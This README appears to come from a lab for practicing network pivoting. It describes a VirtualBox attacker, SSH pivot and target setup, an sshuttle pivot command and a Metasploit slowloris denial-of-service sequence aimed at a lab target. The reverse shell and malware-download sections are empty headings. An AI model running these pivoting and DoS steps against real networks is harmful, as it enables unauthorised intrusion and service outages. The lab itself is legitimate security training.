# NM-Lab-Network-pivoting

This is a Lab for practicing network pivoting.

## Prerequisite

### Network architecture

The following is our network settings for doing this Lab.

Local (Attacker)  
OS : MacOS or Kali Linux  
IP : 192.168.2.105 (For example)(Connect with Internet)  

VirtualBox VM1 (SSH Server)  
OS : Ubuntu server 20.04  
(Adapter1 橋接網路卡Bridge enp0s3) IP : 192.168.2.113 (For example)  
(Adapter2 內網Internal enp0s8) IP : 192.168.1.1 (For example)  

VirtualBox VM2 (Target machine)  
OS : Ubuntu server 20.04.2 or Kali Linux  
(Adapter2 內網 enp0s8) 192.168.1.100 (For example)    

VirtualBox VM3 (option)  
OS : Metasploitable2 (For running DVWA)  
(You can also install DVWA on the target machine, but it is quite a long process for installing DVWA alone.)  

Step 1 :  
完成VirtualBox的網路介面卡設定  
確認連接內網的網路卡擁有相同的名稱  

Step 2 :  
登陸兩(三)台要連接內網的VM之後，使用  
$ ifconfig -a  
確認內網網路卡的名稱 (In our case, enp0s8)  
然後使用指令  
$ sudo ifconfig enp0s8 192.168.1.1 netmask 255.255.255.0 up  
開啟網路卡  
192.168.1.1 可以自己設定 (不同的機器要不同 192.168.1.1 192.168.1.100 in our case)  
不過注意每一次開機都要設定  

這樣即完成網路設定
可以用ping指令確認

### Enviroment & Installation

Local (Attacker)  

Ssuttle (For pivoting)  
https://github.com/sshuttle/sshuttle  
Nmap (For scanning)(option)  
https://nmap.org/book/inst-macosx.html  
Metasploit (For using slowloris DOS attack exploit module)  
https://www.metasploit.com    

VirtualBox VM1 (SSH Server)  

ssh service need to be enable  
http service (Apache web service) need to be enable  
root account for sshuttle  
normal user account for port forwarding  

VirtualBox VM2 (Target machine)  

ssh service need to be enable  
http service (Apache web service) need to be enable  

## Ways of Pivoting

### sshuttle

Open terminal  
$ sshuttle -r user@192.168.2.113 192.168.1.0/24  
Need root privilege for both local & the ssh server  

### dynamic port forwarding


### reverse remote port forwarding


## Ways of Attack

### DOS

Open terminal  
Run metasploitable  
Somewhere in the /opt/metasploit-framework/bin/ if you are using MacOS (High Sierra) like me  
$ ./msfconsole  
(Some configurations if first time use)  
msf6 > search slowloris  
msf6 > use auxiliary/dos/http/slowloris  
msf6 auxiliary(dos/http/slowloris) > options  
msf6 auxiliary(dos/http/slowloris) > set sockets 200 (the number doesn't really matter)  
msf6 auxiliary(dos/http/slowloris) > set rhost 192.168.1.100  
msf6 auxiliary(dos/http/slowloris) > run  

Now you should see it working !!!  

### reverse shell


### downloading other malwares
